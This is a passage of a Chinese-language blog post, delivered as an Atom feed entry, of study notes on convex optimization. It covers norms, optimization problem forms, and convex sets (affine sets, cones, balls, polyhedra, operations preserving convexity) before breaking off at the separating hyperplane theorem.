  <entry>
    <title>Convex &amp; Optimizations</title>
    <link href="https://blog.sjtuxhw.top/review/convex-opt/"/>
    <id>https://blog.sjtuxhw.top/review/convex-opt/</id>
    <published>2024-06-15T07:18:39.000Z</published>
    <updated>2024-10-25T13:53:52.660Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Chapter-1-Overview"><a href="#Chapter-1-Overview" class="headerlink" title="Chapter 1. Overview"></a>Chapter 1. Overview</h1><p>进入本章前复习基础的数学知识：</p><ul><li><p>Vector Norms（范数）：对于向量 $x=(x_1,x_2,\ldots,x_n)$，$l_p$-norm 定义为：</p><script type="math/tex; mode=display">||x||_p={}^p\sqrt{|x|_1^p+|x|_2^p+\cdots+|x|_n^p}</script><p>正定性：$||x||_p\ge0,\space||x||_p=0\space\iff x=0$；</p><p>非线性性：$||tx||=|t|\space||x||,\space t\in\mathbf{R}$，$||x+y||\le||x||+||y||$（这个不等式并不好证。好证的三角不等式仅限于范数为 2 的特殊情况）；</p></li><li><p>正交阵 $A^TA=I$，因此一定满秩。此外正交阵列向量（或行）一定是相互正交的向量组，且模长为 1（单位正交向量，否则 $A^TA$ 就不是单位向量了）。</p><p>正交阵可以进行对角化 $A=P^{-1}BP$（$B$ 为对角阵，$P$ 为满秩矩阵）。所谓对角化可以感性理解为将这些正交向量组移动到与给定坐标轴的单位向量方向一致的方向上。</p><p>正交变换非常好的性质是 <strong>保范性</strong>。向量经过正交变换后，范数不变（形象理解为几何形状不变）。</p></li><li><p>实对称矩阵与实二次型一一对应。</p><p>实对称阵可以不满秩。但是一定有 $n$ 个实特征值（如果有 $k$ 个相等的特征值，称该特征值为 $k$ 重特征值），或者说 $r(A)$ 个不同的实特征值。</p><p>不相同的实特征值对应的特征向量 <strong>必定相互正交</strong>。</p><p>实对称阵可以进行谱分解（或称特征分解） $A=Q\Lambda Q^T$，可以证明 $Q$ 的每一列都是 $A$ 的一个特征向量（所以 $Q$ 是正交阵），$\Lambda$ 是对角阵，每个对角元对应一个 $A$ 的特征值。</p></li><li><p>Positive definite / positive semi-definite Matrices (正定阵和半正定阵)：若对于任意的 $n$ 维向量 $x\in\mathbf{R}^n$，都有 $x^TAx\ge0$，则称 $A$ 为半正定阵。<u>正定阵是特殊的实对称矩阵，它对应的二次型是正定二次型</u>。正定阵的判定方法如下：</p><ul><li><p>矩阵为对称矩阵，且特征值均为正；</p></li><li><p>矩阵为对称矩阵，且主元符号均为正；</p></li><li><p>矩阵为对称矩阵，其子行列式均为正；</p></li></ul></li></ul><h2 id="1-1-Mathematical-Optimization"><a href="#1-1-Mathematical-Optimization" class="headerlink" title="1.1 Mathematical Optimization"></a>1.1 Mathematical Optimization</h2><p>数学上对于优化问题的定义是：</p><script type="math/tex; mode=display">\begin{aligned}&minimize&f_0(x)&\\&subject\space to&f_i(x)&\le b_i,\quad i\in[1,m]\end{aligned}</script><p>其中</p><ul><li>$x=(x_1,\ldots,x_n)$ 被称为优化变量（optimization variables）;</li><li>$f_0:\mathbf{R}^n\rightarrow\mathbf{R}$ 被称为目标函数（objective function）;</li><li><p>$f_i:\mathbf{R}^n\rightarrow\mathbf{R},i\in[1,m]$ 被称为约束函数（constraint functions）；</p></li><li><p>将使得 $f_0$ 取得最小值，且满足约束条件的向量 $x^*$ 称为最优解（optimal solution）；</p></li></ul><p>常见的应用实例有：</p><ol><li><p>portfolio optimization（投资组合优化）：</p><ul><li>variables: 在不同 assets 上投资的数量；</li><li>constraints: budgets、每个 asset 所能分配的最大/最小金额、最小回报；</li><li>objective：总体风险，或者回报额；</li></ul></li><li><p>device sizing in electronic circuits（电路设计）：</p><ul><li>variables: device widths and lengths；</li><li>constraints: manufacturing limits, timing requirements, maximum area；</li><li>objective: power consumption；</li></ul></li><li><p>data fitting</p><ul><li>variables: model parameters；</li><li>constraints: prior information, parameter limits；</li><li>objective: measure of misfit or prediction error；</li></ul></li></ol><h2 id="1-2-Solving-Optimization-Problems"><a href="#1-2-Solving-Optimization-Problems" class="headerlink" title="1.2 Solving Optimization Problems"></a>1.2 Solving Optimization Problems</h2><p>数学上如何解决这些优化问题？实际上，对于一般的优化问题，相当难以求解，可能是 NP 问题，或者说不能在多项式时间内解决的问题。</p><p>但是我们其中有一类问题是特例，人们研究出了能够高效、可靠解决这类问题的方法，它们就是 <strong>凸优化问题</strong>（Convex Optimization Problem），包括但不限于最小二乘、线性规划、二次规划等等。</p><h3 id="1-2-1-Least-Squares"><a href="#1-2-1-Least-Squares" class="headerlink" title="1.2.1 Least-Squares"></a>1.2.1 Least-Squares</h3><p>最小二乘问题的目标是 $minimize\quad||Ax-b||_2^2$</p><p>目前有准确的解析解：$x^*=(A^TA)^{-1}A^Tb$，软件可以作出精确、高效地解析和运算（时间复杂度 $O(n^2k)$ 其中 $A\in\mathbf{R}^{k\times n}$）；</p><blockquote><p>注：软件层面并不是直接使用解析解运算。有些问题即便没有解析解，也能很简单地运算。解析解是在数学讨论的范围内。</p></blockquote><h3 id="1-2-2-Linear-Programming-LP"><a href="#1-2-2-Linear-Programming-LP" class="headerlink" title="1.2.2 Linear Programming (LP)"></a>1.2.2 Linear Programming (LP)</h3><p>此后会具体阐述的问题。线性规划的定义是：</p><script type="math/tex; mode=display">\begin{aligned}&maximize&c^Tx&\\&subject\space to&a_i^Tx&\le b_i,\quad i\in[1,m]\end{aligned}</script><p>这里一般性线性规划没有解析解，但是借助数学工具，可以以确定的算法步骤，高效可靠地得到答案，时间复杂度 $O(n^2m)$；</p><p>它不像 Least-Square 一样好识别，需要问题转换的技巧；</p><h3 id="1-2-3-Convex-Optimization-Problem"><a href="#1-2-3-Convex-Optimization-Problem" class="headerlink" title="1.2.3 Convex Optimization Problem"></a>1.2.3 Convex Optimization Problem</h3><script type="math/tex; mode=display">\begin{aligned}&minimize&f_0(x)&\\&subject\space to&f_i(x)&\le b_i,\quad i\in[1,m]\end{aligned}</script><p>其中目标函数、约束函数都是凸函数。凸函数定义为：</p><script type="math/tex; mode=display">f_i(\alpha x+\beta y)\le\alpha f_i(x)+\beta f_i(y)</script><p>其中 $\alpha+\beta=1,\space\alpha\ge0,\space\beta\ge0$；</p><blockquote><p>补充：仿射函数定义为 $f_i(\alpha x+\beta y)=\alpha f_i(x)+\beta f_i(y)$；</p></blockquote><ul><li>线性规划、最小二乘法都是 Convex Optimization Problem 的特例；</li><li>没有解析解，但有确定的算法步骤，高效可靠地得到答案，时间复杂度大致为 $\max\left\{n^3,n^2m,F\right\}$，其中 $F$ 为找到 $f_i$ 的一阶、二阶导数（偏导）所需的复杂度；</li><li>难以识别，需要一些技巧。</li></ul><h3 id="1-2-4-Nonlinear-Optimization-NLP-amp-Integer"><a href="#1-2-4-Nonlinear-Optimization-NLP-amp-Integer" class="headerlink" title="1.2.4 Nonlinear Optimization (NLP) &amp; Integer"></a>1.2.4 Nonlinear Optimization (NLP) &amp; Integer</h3><ul><li>Local Optimization Methods：<strong>选好 initial guess，在 feasible point 周围进行优化</strong>；</li><li>Global Optimization Methods：类似穷极法；</li></ul><h1 id="Chapter-2-Convex-Sets"><a href="#Chapter-2-Convex-Sets" class="headerlink" title="Chapter 2. Convex Sets"></a>Chapter 2. Convex Sets</h1><h2 id="2-1-Affine-Set"><a href="#2-1-Affine-Set" class="headerlink" title="2.1 Affine Set"></a>2.1 Affine Set</h2><p><img src="cimgs/affine-set.png"></p><p>仿射集的定义：如果一个仿射集同时包含了点 $x_1$ 和 $x_2$，且二者不相同，那么通过 $x_1$ 和 $x_2$ 直线上所有点的集合都在这个仿射集中。使用 $x=\theta x_1+(1-\theta)x_2$ 表示。</p><blockquote><p>注意，$x$ 是个向量（或者说坐标点）。随着 $\theta$ 的变动，表示的点在直线上滑动。</p></blockquote><p>举例：线性不等式的解集就是一种仿射集 $\left\{x|Ax=b\right\}$（相反地，所有仿射集都能表示为一个线性不等式的解集）；</p><blockquote><p>证明前者：若 $x_1$ 和 $x_2$ 为 $Ax=b$ 的两个不相等的解，那么 $Ax_1=b$，$Ax_2=b$，因此 $A(\theta x_1+(1-\theta)x_2)=\theta Ax_1+(1-\theta)Ax_2=\theta b+(1-\theta)b=b$；</p><p>（可以由 “线性性” 得到这个结论）</p></blockquote><h2 id="2-2-Convex-Set"><a href="#2-2-Convex-Set" class="headerlink" title="2.2 Convex Set"></a>2.2 Convex Set</h2><p>凸集的定义：如果 $x_1$ 和 $x_2$ 是凸集的相异两点，那么 $x_1$ 和 $x_2$ 组成的线段上的所有点也在该凸集内。</p><p>数学表示：$C$ 为凸集 $\Longleftrightarrow$ $\forall x_1,x_2\in C,\space x_1\ne x_2,\space 0\le\theta\le1\Rightarrow \theta x_1+(1-\theta)x_2\in C$；</p><blockquote><p>在 $x_1$ 到 $x_2$ 的线段上的所有点可以由 $x=\theta x_1+(1-\theta)x_2,\space0\le\theta\le1$ 表示。</p></blockquote><p><img src="cimgs/convex-set-def.png"></p><h2 id="2-3-Convex-Combination-Convex-Hull-amp-Convex-Cone"><a href="#2-3-Convex-Combination-Convex-Hull-amp-Convex-Cone" class="headerlink" title="2.3 Convex Combination, Convex Hull &amp; Convex Cone"></a>2.3 Convex Combination, Convex Hull &amp; Convex Cone</h2><p>凸组合的定义：对于一组点 $x_1,\ldots,x_k$，任何可以由 $x=\theta_1x_1+\theta_2x_2+\cdots+\theta_kx_k$ （$\sum\limits_{i=1}^{i=k}\theta_i=1$，$\theta_i\ge0$）表示的点，所构成的集合称为 $x_1,\ldots,x_k$ 的凸组合。</p><blockquote><p>凸组合的仿射系数和为 1.</p><p>一个凸集就是其任意相异两点 $x_1,x_2$ 的凸组合。所以凸集是一种凸组合。</p></blockquote><p>凸包（Convex Hull）的定义：对于一个点集 $S$，$S$ 中所有点的凸组合就称为 $S$ 的凸包，记作 $conv\space S$；</p><blockquote><p>形象的理解就是 <strong>用橡皮筋把最外围的点都包了起来，之后形成的图形，其内部所有的点都包含于凸包</strong>。</p><p>注意！凸包中的点的凸组合不唯一。一个点可以在其他若干个点的多种凸组合中。</p></blockquote><p><img src="cimgs/convex-hull-def.png" height="150px"></p><p>锥组合（Conic Combination）的定义：对于任意两个相异点 $x_1,x_2$，任何可以由 $x=\theta_1x_1+\theta_2x_2,\space \theta_1,\theta_2\ge0$ 表示的点，所构成的集合称为 $x_1,x_2$ 的锥组合。</p><blockquote><p>注意：<strong><u>锥组合没有要求仿射系数和为 1</u>，因此并不能说锥组合等同于凸集</strong>；</p></blockquote><p>凸锥（Convex Cone）的定义：对于一个点集 $S$，$S$ 中所有点的锥组合就称为 $S$ 的凸锥；</p><p><img src="cimgs/convex-cone-def.png" height="200px"></p><p>小小总结一下：</p><p>对于 $S=\left\{x|x=\theta_1x_1+\theta_2x_2\right\}$，其中 $x_1,x_2$ 为相异两点，</p><p>如果 $\theta_1,\theta_2$ 是普通的变量，那么称 $S$ 为 $x_1,x_2$ 的线性组合；</p><p>如果 $\theta_1,\theta_2\ge0$，那么称 $S$ 为 $x_1,x_2$ 的锥组合；</p><blockquote><p> 几何角度的锥组合：$S$ 所代表的区域内任意相异两点，满足原点到该两点连线方向的<u>射线</u>所包围区域中的点都在这个集合内；</p></blockquote><p>如果 $\theta_1+\theta_2=1$，那么称 $S$ 为包含 $x_1,x_2$ 的仿射集；</p><blockquote><p>几何角度的仿射集：$S$ 所代表的区域内任意相异两点所在的<u>直线</u>上的点都在这个集合内；</p></blockquote><p>如果 $\theta_1,\theta_2\ge0$ 且 $\theta_1+\theta_2=1$，那么称 $S$ 为 $x_1,x_2$ 的凸组合，或者说 $S$ 是一个包含 $x_1,x_2$ 的凸集（但没有“凸组合”准确，因为凸组合中的点可以只由 $x_1,x_2$ 凸组合而成）。</p><blockquote><p>几何角度的凸组合：$S$ 所代表的区域内任意相异两点所在的<u>线段</u>上的点都在这个集合内；</p></blockquote><h2 id="2-4-Hyperplanes-amp-Halfspaces"><a href="#2-4-Hyperplanes-amp-Halfspaces" class="headerlink" title="2.4 Hyperplanes &amp; Halfspaces"></a>2.4 Hyperplanes &amp; Halfspaces</h2><p>超平面的定义：$\left\{x|a^Tx=b\right\}$，其中 $a\ne0$（$a$ 为普通向量，0 代表零向量）；</p><p>半空间的定义：$\left\{x|a^Tx\le b\right\}$，其中 $a\ne0$；</p><p>从几何角度看，一个 N 元一次线性等式即可代表一个 N 维超平面，其中系数向量 $a$ 是该超平面的法向量（normal vector）。</p><p>一个 N 元一次线性不等式即可代表一个 N 维半空间，其中系数向量 $a$ 是指向该半空间界面的<u>外法线方向</u>的法向量。</p><p><img src='cimgs/hyperplane-halfspace-def.png' width="500px"></p><p><code>b</code> 向量的值影响的是垂直于 <code>a</code> 方向的超平面 / 半空间的位置；</p><hr><p>结论：</p><ul><li><p>hyperplane 既是仿射集，又是凸集；</p></li><li><p>halfspace 是凸集，但不是仿射集；</p><blockquote><p>回忆一下，仿射集要求集合内任意相异两点的仿射系数和为 1 所表示的点也在这个集合中。在几何角度理解，就是 <strong>区域内任意相异两点所在的直线上的点都在这个集合内</strong>。</p></blockquote></li></ul><p>如果不从几何角度理解，就通过数学语言证明。下面以证明 “halfspace 是凸集” 这一命题为例：</p><p>假设 $x_1,x_2$ 是 halfspace $S$ 上的任意相异两点。</p><p>要证 $S$ 是凸集，即证对 $\forall x=\theta x_1+(1-\theta)x_2,\space\theta\in[0,1]$，都有 $a^Tx\le b$ 成立。</p><p>则由条件 $x_1,x_2$ 是 $S$ 上相异两点可知，$a^Tx_1\le b,\space a^Tx_2\le b$；</p><p>故 $a^Tx=a^T\theta x_1+a^T(1-\theta)x_2\le \theta b+(1-\theta)b=b$，即 $a^Tx\le b$，原命题得证。</p><p>以后对于这类简单的证明不再作赘述。</p><h2 id="2-5-Euclidean-Balls-amp-Ellipsoids"><a href="#2-5-Euclidean-Balls-amp-Ellipsoids" class="headerlink" title="2.5 Euclidean Balls &amp; Ellipsoids"></a>2.5 Euclidean Balls &amp; Ellipsoids</h2><p>欧几里得球的定义：对于一个中心点 $x_c$ 和半径 $r$，定义点集：</p><script type="math/tex; mode=display">B(x_c,r)=\left\{x|\space||x-x||_2\le r\right\}=\left\{x_c+ru|\space||u||_2\le1\right\}</script><p> 为欧几里得球；</p><blockquote><p>注：式中的范数符号已定义在 Chapter 1 中，遗忘可以前往复习。</p></blockquote><p>椭球的定义：对于中心点 $x_c$，定义点集：</p><script type="math/tex; mode=display">\begin{equation}E=\left\{x|(x-x_c)^TP^{-1}(x-x_c)\le1\right\}\end{equation}</script><p>其中 $P\in\mathbf{S}^n_{++}$ （$P$ 为正定阵，正定阵一定是对称阵），上式也被称为二次不等式（quadratic inequality）。</p><p>注意：由解析几何的知识，<strong><u>椭球的半轴向量由 $P$ 的特征向量给出</u>，<u>椭球的半轴长由对应的特征值 $\sqrt{\lambda_i}$ 给出</u></strong>;</p><blockquote><p>因此，$P=r^2I$（$I$ 为单位矩阵）时，椭球就是一个欧几里得球；所以椭球是欧几里得球的泛化（generalization）；</p><p>另注：</p><p>$\mathbf{S}^n$ 表示 $n$ 阶对称阵组成的集合；</p><p>$\mathbf{S}^n_{++}=\left\{X\in S^n|X\succ0\right\}$ 表示所有 $n$ 阶正定阵组成的集合（概率学中的协方差矩阵就是一个正定阵）；</p><p>$\mathbf{S}^n_{+}=\left\{X\in S^n|X\succeq0\right\}$ 表示所有 $n$ 阶半正定阵组成的集合；</p></blockquote><p>当然椭球也可以表示为 $E=\left\{x_c+Au|\space||u||_2\le1\right\}$，其中 $A$ 为非奇异方阵。可以形象地理解为 $A$ “记录了椭球各个方向上的半径”。</p><blockquote><p>另外需要注意的是，$P$ 可以唯一表示一个椭球，这意味着 $P$ 与椭球点集<u>一一对应</u>。</p><p>但是 $A$ 却不能唯一表示一个椭球。因为对任意正交阵 $Q$（定义 $Q^TQ=I$），$AQ$ 表示的是一个椭球。</p><p>证明：</p><script type="math/tex; mode=display">\begin{aligned}&\left\{x_c+Au|\space||u||_2\le1\right\}\\=\space&\left\{x_c+AQQ^Tu|\space||u||_2\le1\right\}\\=\space&\left\{x_c+(AQ)(Q^Tu)|\space||Q^Tu||_2\le1\right\}\quad(||u||_2=||Q^Tu||_2)\\=\space&\left\{x_c+(AQ)u|\space||u||_2\le1\right\}\quad(\forall u)\end{aligned}</script><p>其中 $||u||_2=||Q^Tu||_2$ 由正交阵的保范性（$(Qu)^T(Qu)=u^TQ^TQu=u^Tu\Longrightarrow||Qu||=||u||$）得到。</p><p>再但！如果 $A$ 是个正定阵，那么这个表示又唯一了。</p></blockquote><hr><p>结论：欧几里得球、椭球是一个凸集。</p><h2 id="2-6-Norm-Balls-amp-Norm-Cones"><a href="#2-6-Norm-Balls-amp-Norm-Cones" class="headerlink" title="2.6 Norm Balls &amp; Norm Cones"></a>2.6 Norm Balls &amp; Norm Cones</h2><p>范式球的定义：对于中心点 $x_c$ 和半径 $r$，定义点集 $N_B=\left\{x|\space||x-x_c||\le r\right\}$ 为范式球；</p><blockquote><p>欧几里得球就是 2-范数下的范式球（或称 “二阶球”，second-order Euclidean ball）。</p></blockquote><p>范式锥的定义：定义图 $N_C=\left\{(x,t)|\space||x||\le t\right\},\space x\in\mathbf{R}^n，t\in\mathbf{R}$ 为范式锥；</p><blockquote><p>这里的 “图” 和计算机中 “图” 数据结构的概念不同。</p><p>这里的 “图” 是数学中的图，表示 “N 维坐标与值的二元组” 的集合，感性理解为：通常将 N 维坐标作为 “横轴”，对应的值为 “纵轴”，作出图形。例如 $\left\{(x,f(x))|x\in\mathbf{R}^n,f(x)\in\mathbf{R}\right\}$ 就是 $n$ 维实函数 $f(x)$ 的图。</p><p>这里范式锥的定义实际上是 <strong>上境图（epigraph）</strong>，因为 $t$ 和 $x$ 不是等号关系（函数关系），而是：$||x||\le t$；因此表示的是如下图锥（实心）；</p><p>另外，如果将小于等于改为大于等于，那么就是 亚图（hypograph）；</p></blockquote><p><img src="cimgs/norm-cone-def.png"></p><blockquote><p>范数为 2 时，范式锥又称为 circular cone（圆锥）；</p><p>此时可以写作 $N_C=\left\{(x,t)|\space x^Tx\le t^2\right\},\space x\in\mathbf{R}^n，t\in\mathbf{R}$</p></blockquote><hr><p>结论：范式球、范式锥都是凸集。</p><h2 id="2-7-Polyhedra-Polytopes"><a href="#2-7-Polyhedra-Polytopes" class="headerlink" title="2.7 Polyhedra (Polytopes)"></a>2.7 Polyhedra (Polytopes)</h2><blockquote><p>多面体 Polyhedron 的复数形式。</p><p>这里要讨论的是 polytopes（多胞形，多面体的特殊情况），也就是封闭的多面体。</p><p>但有些作者把这两个词含义颠倒了。所以建议使用时，固定一种说法，然后用 “封闭的” 形容词来区分这两种情况。</p></blockquote><p>多面体的定义：可以由一组有限个线性不等式和等式的解集所描述的集合。</p><script type="math/tex; mode=display">Ax\preceq b,\quad Cx=d</script><p>其中 $A\in\mathbf{R}^{m\times n},\space C\in\mathbf{R}^{p\times n}$，$\preceq$ 为 component-wise inequality，是逐分量不等号，对每个分量都有一个不等式。这强调的是：$A$ 的每一行的行向量 $a$ 与 $x$ 点积都小于等于向量 $b$ 的对于行的值，即 $ax\le b_i$；这个不等式描述了一个半空间，因此 $Ax\preceq b$ 就描述了一组半空间。</p><p><img src="cimgs/poly-def.png"></p><p>所以说，多面体可以由一组超平面和半空间的交集来表示。</p><h2 id="2-8-Positive-Semi-definite-Cone"><a href="#2-8-Positive-Semi-definite-Cone" class="headerlink" title="2.8 Positive Semi-definite Cone"></a>2.8 Positive Semi-definite Cone</h2><p>半正定锥的定义：对于所有半正定阵构成的集合 $\mathbf{S}^n_+$ 一定是凸锥（这里不再局限于之前讨论的 “点” 了，可以扩展到其他可以通过运算来验证定义的对象上）。这个锥被称为半正定锥。</p><blockquote><p>为什么 $\mathbf{S}^n_+$ 一定是凸锥？因为任意两个半正定阵的锥组合一定还是半正定的（回忆锥组合的定义）。</p></blockquote><h2 id="2-9-Operations-that-preserve-Convexity"><a href="#2-9-Operations-that-preserve-Convexity" class="headerlink" title="2.9 Operations that preserve Convexity"></a>2.9 Operations that preserve Convexity</h2><p>介绍不改变凸性的操作。这样做的意义是，可以将上面几种基本的凸形扩展出去，方便证明某些问题的凸性，方便以后转换问题为凸问题。</p><blockquote><p>就像做微积分中的积分问题，我们先讨论几个原子函数，然后通过一些不改变积分值的运算或变换，来得到更复杂函数的积分值。</p></blockquote><p>实际的应用例如，如何判断给定集合是否为凸集？方法如下：</p><ul><li><p>根据凸集的基本定义判断：$C$ is a convex $\Longleftrightarrow x_1,x_2\in C\Rightarrow \theta x_1+(1-\theta)x_2\in C,\space\theta\in[0,1]$；</p></li><li><p><u>根据不改变凸性的操作，将问题等价转换为以上基本凸形</u>。</p></li></ul><p>那么哪些操作不改变凸性？</p><ul><li>intersection：取交集。两个凸集的交集仍然是凸集；</li><li>affine functions：仿射变换。一个凸集经过仿射变换、仿射变换逆变换后仍然是凸集；</li><li>perspective functions：透视函数变换。</li><li>linear-fractional functions：线性分式函数变换。</li></ul><h3 id="2-9-1-Intersection"><a href="#2-9-1-Intersection" class="headerlink" title="2.9.1 Intersection"></a>2.9.1 Intersection</h3><p>我们如何利用交集不改变凸性的性质来解决一些问题呢？</p><p>举个例子，$S=\left\{x\in\mathbf{R}^m|\space|p(t)|\le1,\space |t|\le\dfrac{\pi}{3}\right\}$，其中 $p(t)=\sum\limits_{k=1}^mx_k\cos kt$（$p(t)$ 为三角多项式，trigonometric polynomial）就是一个凸集。</p><p>怎么证明？想识别这个集合的凸性有点困难，因为 $m\ge5$ 的情况下甚至不能表示出这个集合，所以我们肯定不能用凸集的定义了。</p><p>我们想要化简这个集合来方便操作。试想我们定义另一个集合 $S_t=S|_t=\left\{x\in\mathbf{R}^m|\space|p(t)|\le1\right\}$，如果固定 $t$ 为某个常数，情况是不是简单了点？</p><p>这个时候 $S$ 集合就是多个 $S_t$ 集合的<strong>交集</strong>：$S=\bigcap\limits_{|t|\le\pi/3}S_t$，因此我们看看能否证明 $S_t$ 的凸性，就能直接得到 $S$ 的凸性了。</p><blockquote><p>为什么 $S$ 集合是多个 $S_t$ 集合的<strong>交集</strong>？</p><p>可以这么理解，对某个 $t$ 的 $S_t$ 中，可能包含了满足对所有 $|t|\le\dfrac{\pi}{3},|p(t)|\le1$ 的点，也可能包含仅仅在当前的 $t$ 下才满足 $|p(t)|\le1$ 的点。作交集就筛除了不满足 $|t|\le\dfrac{\pi}{3}$ 下 $|p(t)|\le1$ 条件的点。</p><p>这就是性质：</p><script type="math/tex; mode=display">\left\{x|Pred(x,y),y\in A\cup B\right\}=\left\{x|Pred(x,y),y\in A\right\}\cap\left\{x|Pred(x,y),y\in B\right\}</script></blockquote><p>结果发现 $S_t$ 相当容易判断凸性，因为这个时候 $p(t)$ 退化为了关于向量 $x$ 的线性约束条件：</p><script type="math/tex; mode=display">\begin{aligned}S_t=&\left\{x\in\mathbf{R}^m|\space|p(t)|\le1\right\}\\=&\left\{x\in\mathbf{R}^m|-1\le\left[\begin{aligned}\cos t\\\cos 2t\\\cdots\\\cos mt\end{aligned}\right]x\le1\right\}\end{aligned}</script><p>这不就是两个半空间所夹成的区域的点集（取交集）吗！我们知道 halfspace 是凸集，两个 halfspce 的交集也是凸集，因此 $S_t$ 是凸集。</p><p>因为这里 $t$ 是任意的，所以对所有固定的 $t$ 都有 $S_t$ 是凸集，而 $S$ 是所有 $|t|\le\dfrac{\pi}{3}$ 情况的 $S_t$ 的交集，所以 $S$ 是凸集。</p><h3 id="2-9-2-Affine-Function"><a href="#2-9-2-Affine-Function" class="headerlink" title="2.9.2 Affine Function"></a>2.9.2 Affine Function</h3><p>仿射函数定义为：对定义域上任意两个值 $x,y$，对任意的 $\theta\in[0,1]$，都有 $f(\theta x+(1-\theta)y)=\theta f(x)+(1-\theta)f(y)$，因此也是一种非凸非凹的函数。</p><p>假设函数 $f:\mathbf{R}^n\rightarrow\mathbf{R}^m$ 是仿射函数（就是线性变换）；</p><blockquote><p>例如自变量为向量的仿射函数 $f(x)=Ax+b$，其中 $A\in\mathbf{R}^{m\times n},b\in\mathbf{R}^m$；</p></blockquote><p>那么凸集关于仿射函数函数的像（或者说凸集经过仿射变换后得到的集合）一定是凸集：</p><script type="math/tex; mode=display">S\subseteq \mathbf{R}^n\space convex\Longrightarrow f(S)=\left\{f(x)|x\in S\right\}\space convex</script><p>逆变换也是如此。如果一个集合经过仿射变换后的像是凸集，那么原先的集合也是凸集：</p><script type="math/tex; mode=display">C\subseteq\mathbf{R}^m\space convex\Longrightarrow f^{-1}(C)=\left\{x\in\mathbf{R}^n|f(x)\in C\right\}\space convex</script><blockquote><p>甚至这个 $f$ 不是个可逆函数（比如 $f$ 不是单射函数，但 $f$ 作为一个关系而言，是可逆的），上式也成立。</p></blockquote><p>常见的仿射函数有：缩放（scaling）、平移（translation）、投影（projection）等。</p><p>仿射函数可以用在哪些题型上？</p><p>例如线性矩阵不等式的解集 $\left\{x|x_1A_1+x_2A_2+\cdots+x_mA_m\preceq B\right\}$，其中 $A_i,B\in\mathbf{S}^p$ 。</p><p>这个时候，判断这个集合的凸性可以定义一个函数 $f:\mathbf{R}^m\rightarrow\mathbf{S}^p$（将 $m$ 维向量映射到 $p$ 阶对称矩阵上），这个函数定义为 $f(x)=B-\sum\limits_{i=1}^mx_iA_i$。很容易知道 $f$ 的像（集合）一定是一个 positive semi-definite cone（半正定锥，因为对任意的 $x$ 都有 $f(x)\succeq0$，$f(x)\in \mathbf{S}^p$），即凸集，因此原集合（$f(x)$ 的逆像）也是一个凸集。</p><p>再例如双曲锥面，$\left\{x|x^TPx\le(c^Tx)^2,\space c^Tx\ge0\right\}$，其中 $P\in\mathbf{S}^n_+$；</p><p>判断这个集合为凸集，也可以构造一个函数，$f:\mathbf{R}^n\rightarrow (\mathbf{R}^n,\mathbf{R})$，即 $f(x)=(P^{1/2}x,\space c^Tx)$，其中 $(P^{1/2})^2=P$；$f$ 就是个仿射函数（可以按仿射函数定义来测试），并且 $\left\{(x,t)|\space x^Tx\le t^2\right\},\space x\in\mathbf{R}^n，t\in\mathbf{R}$（二阶范式锥）正好是双曲锥面在 $f$ 上的像，因此双曲锥面是个凸集。</p><h3 id="2-9-3-Perspective-amp-Linear-Fractional-Function"><a href="#2-9-3-Perspective-amp-Linear-Fractional-Function" class="headerlink" title="2.9.3 Perspective &amp; Linear-Fractional Function"></a>2.9.3 Perspective &amp; Linear-Fractional Function</h3><p>透视函数定义为 $f:\mathbf{R}^{n+1}\rightarrow\mathbf{R}^n$（所有降低参数 1 个维度的函数）；</p><p>例如 $P(x,t)=\dfrac{x}{t}$，$dom\space P=\left\{(x,t)|t\gt0\right\}$；就是一个透视函数。</p><p>透视函数的像、逆像中有一个是凸集，那么另一个就是凸集。</p><hr><p>线性分式函数是 透视函数 和 仿射函数 的复合，定义为：$f(x)=\dfrac{Ax+b}{C^Tx+d}$，其中 $dom\space f=\left\{c^Tx+d\gt0\right\}$；</p><p>线性分式函数的像、逆像中有一个是凸集，那么另一个就是凸集。</p><h2 id="2-10-Generalized-Inequality"><a href="#2-10-Generalized-Inequality" class="headerlink" title="2.10 Generalized Inequality"></a>2.10 Generalized Inequality</h2><p>为了定义广义不等式（以便对凸优化进行处理、评价），人们引入了 proper cone（正常锥）的概念。</p><p>如果一个凸锥满足：</p><ul><li>K is closed (contains its boundary)</li><li>K is solid (has nonempty interior)</li><li>K is pointed (contains no line)</li></ul><p>那么这个凸锥就是正常锥。常见的正常锥有：</p><ul><li>非负实数集合 $R_+$；</li><li>非负象限 $R^n_+$；</li><li>半正定阵集合 $S^n_+$；</li></ul><p>简而言之，<u>正常锥是为了描述一种抽象的非负关系</u>（可以与离散数学中的偏序关系联系起来考虑），例如对向量而言的广义不等式可以在非负象限内考虑（感性理解：<u>两个向量之差在非负象限内才是广义大于关系</u>）：</p><script type="math/tex; mode=display">x\preceq_{\mathbf{R}^n_+}y\Longleftrightarrow x_i\le y_i</script><p>对于矩阵而言可以在半正定矩阵集合内考虑：</p><script type="math/tex; mode=display">X\preceq_{\mathbf{S}^n_+}Y\Longleftrightarrow Y-X\quad positive\space semidefinite</script><p>这样会发现（和偏序关系一样），广义不等式的许多性质（例如自反性、反对称性、传递性等）都和实数域上的不等关系一样。</p><p>但是，根据离散数学中的定义，广义不等关系不一定是线序关系（可以同时有 $x\npreceq_Ky$ 和 $y\npreceq_Kx$，即二者不可比）；</p><p>但我们仍然可以定义广义不等关系的 “最小元素”（为以后的凸优化做准备），但是因为 “不可比” 关系的存在，“最小” 的概念分裂成了最小元素（minimum，所有的元素都可与这个元素比较，并且是最小的）和 极小元素（minimal，可以与这个元素比较的所有元素都比它大）。它们的含义已经在离散数学的 “关系” 一章定义清楚了。</p><p><img src="cimgs/min-elements-def.png" height="400px"></p><p>如上图，在 $\mathbf{R}^n_+$ 中，凸集 $S_1$ 的最小元素是 $x_1$，因为它可以在 $R^n_+$ 上与其他任何元素比较（即凸集代表的图像全部包含在阴影部分区域内），并且它比所有元素都小；</p><p>凸集 $S_2$ 没有最小元素（因为发现 $\mathbf{R}^n_+$ 总是无法完全盖住这个凸集代表的图形，意味着有些元素间不可比），但它有无穷多个极小元素。其中一个极小元素 $x_2$，因为所有能比较的元素中，没有比它小的（即它的非正轴区域没有任何元素）。可以说 $x_2$ 所在的平边界上所有点都是 $S_2$ 关于 $\mathbf{R}^n_+$ 的极小元素。</p><h2 id="2-11-Seperating-amp-Supporting-Hyperplane-Theorem"><a href="#2-11-Seperating-amp-Supporting-Hyperplane-Theorem" class="headerlink" title="2.11 Seperating &amp; Supporting Hyperplane Theorem"></a>2.11 Seperating &amp; Supporting Hyperplane Theorem</h2><p>超平面分割定理。直觉上非常明显的定理。如果 $C$ 和 $D$ 是两个不相交凸集，那么必然存在向量 $a\ne0$ 和 $b$ 